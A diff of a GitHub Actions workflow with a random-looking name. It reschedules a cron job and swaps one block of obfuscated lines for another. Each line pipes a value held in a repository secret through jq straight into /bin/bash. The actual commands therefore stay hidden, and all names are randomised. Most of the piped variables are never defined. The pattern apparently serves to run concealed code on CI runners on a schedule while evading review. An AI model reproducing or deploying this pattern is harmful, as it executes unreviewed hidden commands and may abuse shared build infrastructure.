@@ -3,28 +3,25 @@ name: wangwuxxi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 5/6 * * *'
+    - cron: '27 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wangwuxxi
         env:
-          oc069: ${{ secrets.oc069 }}
+          cz40: ${{ secrets.cz40 }}
         run: |
-          echo $oc069 | jq -r .c1 | /bin/bash
-          echo $og788 | jq -r .yn92867 | /bin/bash
-          echo $phc9279 | jq -r .cy80 | /bin/bash
-          echo $xxnxw8730 | jq -r .dn89106 | /bin/bash
-          echo $znat4591 | jq -r .ltpa43 | /bin/bash
-          echo $ywwl635 | jq -r .yuxhq6 | /bin/bash
-          echo $j019 | jq -r .w36 | /bin/bash
-          echo $xajxg076 | jq -r .nk1 | /bin/bash
-          echo $bluq73954 | jq -r .gnpo61589 | /bin/bash
-          echo $rn60 | jq -r .y7 | /bin/bash
-          echo $ir236 | jq -r .delh0 | /bin/bash
-          echo $y54977 | jq -r .kn11377 | /bin/bash
-          echo $z8737 | jq -r .db97 | /bin/bash
+          echo $cz40 | jq -r .viq24 | /bin/bash
+          echo $r24 | jq -r .sufbc6 | /bin/bash
+          echo $jf11435 | jq -r .byix6005 | /bin/bash
+          echo $xbno869 | jq -r .wbdc0635 | /bin/bash
+          echo $qtg085 | jq -r .nr3 | /bin/bash
+          echo $lmfvu28 | jq -r .edb038 | /bin/bash
+          echo $nod93 | jq -r .vgk1 | /bin/bash
+          echo $hbkjr40 | jq -r .byrwb76236 | /bin/bash
+          echo $hpwi64 | jq -r .w35006 | /bin/bash
 
